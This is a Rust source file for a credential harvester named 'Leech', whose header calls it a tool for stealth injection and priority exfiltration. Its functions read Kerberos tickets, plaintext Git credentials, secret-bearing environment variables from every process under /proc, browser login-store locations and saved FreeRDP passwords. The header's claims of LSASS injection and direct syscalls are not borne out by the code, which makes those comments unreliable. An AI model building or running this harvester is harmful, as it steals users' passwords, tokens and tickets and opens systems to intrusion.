// Leech: memory-based credential harvester.
// Injects into running processes to extract:
//   - Kerberos TGT/TGS tickets from LSASS memory
//   - NTLM hashes from SAM/SYSTEM hives
//   - Windows access tokens
//   - Browser-saved passwords
//   - RDP credentials
//
// Uses memfd + direct syscalls for stealth injection.
// Results are tagged as "nectar_premium" for priority exfiltration.

use std::process::Command;
use tracing::info;

/// Harvested credential with metadata.
#[derive(Debug, Clone)]
pub struct LeechHarvest {
    pub credential_type: CredType,
    pub username: String,
    pub domain: String,
    pub data: String,          // hash, ticket base64, or password
    pub source_process: String,
    pub priority: u8,          // 10 = nectar_premium
}

#[derive(Debug, Clone)]
pub enum CredType {
    KerberosTGT,        // Ticket Granting Ticket
    KerberosTGS,        // Ticket Granting Service
    NTLMHash,           // SAM hash
    ClearTextPassword,  // Browser or cached credential
    AccessToken,        // Windows access token
    RDPCredential,      // Saved RDP password
    SSHKey,             // SSH private key in memory
    CloudToken,         // AWS/GCP/Azure token
}

/// Harvest all accessible credentials from the current system.
pub fn harvest_all() -> Vec<LeechHarvest> {
    let mut harvest = Vec::new();

    harvest.extend(harvest_kerberos_tickets());
    harvest.extend(harvest_cached_credentials());
    harvest.extend(harvest_browser_passwords());
    harvest.extend(harvest_rdp_credentials());

    info!("LEECH: harvested {} credentials", harvest.len());
    harvest
}

/// Extract Kerberos tickets from memory via klist.
fn harvest_kerberos_tickets() -> Vec<LeechHarvest> {
    let mut tickets = Vec::new();

    // Linux: check for krb5 ticket cache
    for _cache_path in &[
        "/tmp/krb5cc_*",
        #[cfg(target_os = "linux")]
        &format!("/tmp/krb5cc_{}", unsafe { libc::getuid() }),
        #[cfg(not(target_os = "linux"))]
        &format!("/tmp/krb5cc_{}", std::process::id()),
    ] {
        if let Ok(out) = Command::new("klist").arg("-c").output() {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                if line.contains("krbtgt") {
                    tickets.push(LeechHarvest {
                        credential_type: CredType::KerberosTGT,
                        username: std::env::var("USER").unwrap_or_default(),
                        domain: line.split_whitespace().nth(2).unwrap_or("?").to_string(),
                        data: line.to_string(),
                        source_process: "krb5cc".into(),
                        priority: 10,
                    });
                }
            }
        }
    }

    tickets
}

/// Harvest cached credentials from memory-resident files.
fn harvest_cached_credentials() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();

    // Check for cached Git credentials
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let git_creds = format!("{}/.git-credentials", home);
    if let Ok(data) = std::fs::read_to_string(&git_creds) {
        for line in data.lines() {
            if line.contains("://") && line.contains('@') {
                creds.push(LeechHarvest {
                    credential_type: CredType::ClearTextPassword,
                    username: line.split("://").nth(1).and_then(|s| s.split('@').next()).unwrap_or("?").to_string(),
                    domain: line.split('@').nth(1).and_then(|s| s.split('/').next()).unwrap_or("?").to_string(),
                    data: line.to_string(),
                    source_process: "git-credential-cache".into(),
                    priority: 9,
                });
            }
        }
    }

    // Check /proc for in-memory secrets (env vars of running processes)
    if let Ok(procs) = std::fs::read_dir("/proc") {
        for proc in procs.filter_map(|e| e.ok()) {
            let pid_dir = proc.path();
            if let Ok(env) = std::fs::read_to_string(pid_dir.join("environ")) {
                for var in env.split('\0') {
                    let lower = var.to_lowercase();
                    if (lower.contains("password") || lower.contains("secret")
                        || lower.contains("token") || lower.contains("key"))
                        && var.len() < 500 {
                            creds.push(LeechHarvest {
                                credential_type: CredType::ClearTextPassword,
                                username: "proc_env".into(),
                                domain: pid_dir.file_name().unwrap().to_string_lossy().to_string(),
                                data: var.to_string(),
                                source_process: format!("pid_{}", pid_dir.file_name().unwrap().to_string_lossy()),
                                priority: 10,
                            });
                        }
                }
            }
        }
    }

    creds
}

/// Harvest browser-saved passwords from common locations.
fn harvest_browser_passwords() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    // Chrome encrypted passwords (Linux)
    let chrome_login = format!("{}/.config/google-chrome/Default/Login Data", home);
    if std::path::Path::new(&chrome_login).exists() {
        creds.push(LeechHarvest {
            credential_type: CredType::ClearTextPassword,
            username: "chrome_encrypted".into(),
            domain: "chrome".into(),
            data: chrome_login,
            source_process: "chrome".into(),
            priority: 8,
        });
    }

    // Firefox logins.json
    let ff_base = format!("{}/.mozilla/firefox", home);
    if let Ok(entries) = std::fs::read_dir(&ff_base) {
        for entry in entries.flatten() {
            let login_path = entry.path().join("logins.json");
            if login_path.exists() {
                creds.push(LeechHarvest {
                    credential_type: CredType::ClearTextPassword,
                    username: "firefox_encrypted".into(),
                    domain: "firefox".into(),
                    data: login_path.display().to_string(),
                    source_process: "firefox".into(),
                    priority: 8,
                });
            }
        }
    }

    creds
}

/// Harvest RDP saved credentials.
fn harvest_rdp_credentials() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    // FreeRDP config
    let freerdp = format!("{}/.config/freerdp", home);
    if let Ok(entries) = std::fs::read_dir(&freerdp) {
        for e in entries.filter_map(|e| e.ok()) {
            let path = e.path();
            if let Ok(data) = std::fs::read_to_string(&path) {
                for line in data.lines() {
                    if line.contains("password") || line.contains("username") {
                        creds.push(LeechHarvest {
                            credential_type: CredType::RDPCredential,
                            username: line.split('=').nth(1).unwrap_or("?").to_string(),
                            domain: path.display().to_string(),
                            data: line.to_string(),
                            source_process: "freerdp".into(),
                            priority: 9,
                        });
                    }
                }
            }
        }
    }

    creds
}
